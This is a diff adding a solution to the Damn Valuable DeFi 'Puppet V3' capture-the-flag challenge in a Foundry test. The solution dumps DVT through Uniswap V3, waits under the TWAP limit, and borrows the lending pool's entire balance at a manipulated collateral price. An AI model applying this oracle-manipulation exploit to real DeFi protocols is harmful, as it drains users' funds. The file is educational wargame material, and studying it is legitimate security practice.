@@ -10,6 +10,7 @@ import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
 import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";
+import {ISwapRouter} from "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
 
 contract PuppetV3Challenge is Test {
     address deployer = makeAddr("deployer");
@@ -27,8 +28,10 @@ contract PuppetV3Challenge is Test {
     INonfungiblePositionManager positionManager =
         INonfungiblePositionManager(payable(0xC36442b4a4522E871399CD717aBDD847Ab11FE88));
     WETH weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
+    ISwapRouter router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
     DamnValuableToken token;
     PuppetV3Pool lendingPool;
+    IUniswapV3Pool uniswapPool;
 
     uint256 initialBlockTimestamp;
 
@@ -68,8 +71,8 @@ contract PuppetV3Challenge is Test {
             sqrtPriceX96: _encodePriceSqrt(1, 1)
         });
 
-        IUniswapV3Pool uniswapPool = IUniswapV3Pool(uniswapFactory.getPool(address(weth), address(token), FEE));
-        uniswapPool.increaseObservationCardinalityNext(40);
+        IUniswapV3Pool _uniswapPool = IUniswapV3Pool(uniswapFactory.getPool(address(weth), address(token), FEE));
+        uniswapPool = _uniswapPool;
 
         // Deployer adds liquidity at current price to Uniswap V3 exchange
         weth.approve(address(positionManager), type(uint256).max);
@@ -119,7 +122,36 @@ contract PuppetV3Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV3() public checkSolvedByPlayer {
+        // Pre-allocate observation buffer to support TWAP calculations over 10-minute window
+        uniswapPool.increaseObservationCardinalityNext(40);
         
+        // Dump all DVT through the router to crash DVT/WETH price.
+        uint256 dvtBalance = token.balanceOf(player);
+        token.approve(address(router), dvtBalance);
+        router.exactInputSingle(
+            ISwapRouter.ExactInputSingleParams({
+                tokenIn: address(token),
+                tokenOut: address(weth),
+                fee: FEE,
+                recipient: player,
+                deadline: block.timestamp,
+                amountIn: dvtBalance,
+                amountOutMinimum: 0,
+                sqrtPriceLimitX96: 0
+            })
+        );
+
+        // Let manipulated price have weight in 10-minute TWAP while staying under 115s limit.
+        skip(114);
+
+        // Borrow all pool tokens with manipulated collateral requirement.
+        uint256 borrowAmount = token.balanceOf(address(lendingPool));
+        uint256 requiredWeth = lendingPool.calculateDepositOfWETHRequired(borrowAmount);
+        weth.approve(address(lendingPool), requiredWeth);
+        lendingPool.borrow(borrowAmount);
+
+        // Send drained tokens to recovery.
+        token.transfer(recovery, borrowAmount);
     }
 
     /**
